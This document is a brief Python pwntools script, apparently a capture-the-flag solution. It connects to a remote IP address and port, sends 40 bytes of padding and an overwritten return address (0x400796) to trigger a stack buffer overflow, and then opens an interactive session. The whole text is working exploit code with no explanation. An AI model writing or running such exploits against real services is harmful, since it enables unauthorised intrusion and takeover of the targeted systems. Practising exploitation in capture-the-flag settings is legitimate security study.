from pwn import *
import struct

r = remote("104.199.235.135", 2111)

# payload
padding = 'A'*40
ret = struct.pack('I',0x400796) + '\0'*4
payload = padding+ret

r.send(payload)

r.interactive()
